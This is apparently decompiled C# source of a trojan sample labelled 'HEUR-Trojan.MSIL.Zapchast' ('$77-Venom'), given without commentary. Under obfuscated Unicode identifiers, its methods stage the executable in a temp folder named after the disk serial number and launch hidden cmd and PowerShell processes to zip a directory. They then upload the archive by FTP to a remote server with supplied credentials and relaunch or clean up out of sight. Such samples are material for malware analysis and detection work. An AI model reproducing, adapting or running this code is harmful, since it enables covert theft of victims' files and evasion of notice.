// Decompiled with JetBrains decompiler
// Type: ꭙ芄뀐ᓣ끊ꊭ볬᝞㯺䪼䅳뷧⼎粬䫼 쉳겅֧⓱
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;

public class ꭙ芄뀐ᓣ끊ꊭ볬\u175E㯺䪼䅳뷧\u2F0E粬䫼\u2003쉳겅֧\u24F1
{
  private const string \u2821\uE6D1팜\u193E얽復얗\uA63E溬\uA7C3頶鏳Á\u0FC9狇睋ᇍ늣鹊ꈙ = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  private static readonly Random ᖸⷱ責韭掚\uF69EϏ\uE744礣讣咂\u296A\uFFFD곮䔊ᆼ粕띣娜猴 = new Random(Environment.TickCount);

  public static string \u2A84绑䭦㽔锸\uEA53뿂鞸慡㾠狳\uF495ꨊ翱橜犯\uF2E2盞ၒ壸() => Path.GetRandomFileName().Replace(".", "");

  public static void 縔៎珺臧쨦䦚\uFBCB\u4DD3\uFAE7彜詓\uFFFD缽㻛잟ഠҠ衘谍墘(string dir)
  {
    string path = Environment.GetEnvironmentVariable("temp") + "\\" + ꭙ芄뀐ᓣ끊ꊭ볬\u175E㯺䪼䅳뷧\u2F0E粬䫼\u2003쉳겅֧\u24F1.㩂퐖ᮀỸ\u2150꺿薆빽\uE918뺻羨頪\u26C7\uF238퍲\u191F鄻㯫\u0868풩();
    if (!Directory.Exists(path))
      return;
    Directory.Delete(path);
  }

  public static void 꾥ᵲ\u26D8胜ӷ᳖ꪢ飅\uE761鑅囸슩趯스궃콗薞廴扦\uE4FA(string name) => Process.Start(new ProcessStartInfo()
  {
    Arguments = "/C choice /C Y /N /D Y /T 1 & \"" + name + " --zip\"",
    WindowStyle = ProcessWindowStyle.Hidden,
    CreateNoWindow = true,
    FileName = "cmd.exe"
  });

  public static string 㩂퐖ᮀỸ\u2150꺿薆빽\uE918뺻羨頪\u26C7\uF238퍲\u191F鄻㯫\u0868풩()
  {
    string str = "";
    try
    {
      ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":\"");
      managementObject.Get();
      str = managementObject["VolumeSerialNumber"].ToString();
    }
    catch (Exception ex)
    {
    }
    return str;
  }

  public static void 얔嗴笢\uFFFD챕숊\uF1AD㧱䄾\u2838岜ꊯｙ\uEC80푵\u221B꼈旰㵦겶(string dir, string zipPath) => Process.Start(new ProcessStartInfo()
  {
    FileName = "cmd",
    Arguments = "/k start /b powershell Compress-Archive -Path " + dir + " -DestinationPath " + zipPath + " & exit",
    CreateNoWindow = true,
    WindowStyle = ProcessWindowStyle.Hidden,
    UseShellExecute = true,
    ErrorDialog = false
  });

  public static string \uAAEC皸ﶤ衻ꋝ覰슙吀倓\u2253閈䧳침凟ᨦ䣳\uF457橈\uECB6\uFFFD()
  {
    try
    {
      string path = Environment.GetEnvironmentVariable("Temp") + "\\" + ꭙ芄뀐ᓣ끊ꊭ볬\u175E㯺䪼䅳뷧\u2F0E粬䫼\u2003쉳겅֧\u24F1.㩂퐖ᮀỸ\u2150꺿薆빽\uE918뺻羨頪\u26C7\uF238퍲\u191F鄻㯫\u0868풩();
      Directory.CreateDirectory(path);
      System.IO.File.Move(Directory.GetCurrentDirectory() + "\\" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name, path + "\\temp.exe");
      return path;
    }
    catch (Exception ex)
    {
    }
    return (string) null;
  }

  public static void 䑠曒\uFFFD\uE28A瞒\u2013鲮ジ\u32F3ᵈ鎛\u2BB8\u2683滵쥂鵁Ⲛᣀ堡\uEB78(
    string FTPAddress,
    string zipName,
    string username,
    string password)
  {
    FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(FTPAddress + "/" + Path.GetFileName(zipName));
    ftpWebRequest.Method = "STOR";
    ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(username, password);
    ftpWebRequest.UsePassive = true;
    ftpWebRequest.UseBinary = true;
    ftpWebRequest.KeepAlive = false;
    FileStream fileStream = System.IO.File.OpenRead(zipName);
    byte[] buffer = new byte[fileStream.Length];
    fileStream.Read(buffer, 0, buffer.Length);
    fileStream.Close();
    Stream requestStream = ftpWebRequest.GetRequestStream();
    requestStream.Write(buffer, 0, buffer.Length);
    requestStream.Close();
  }
}
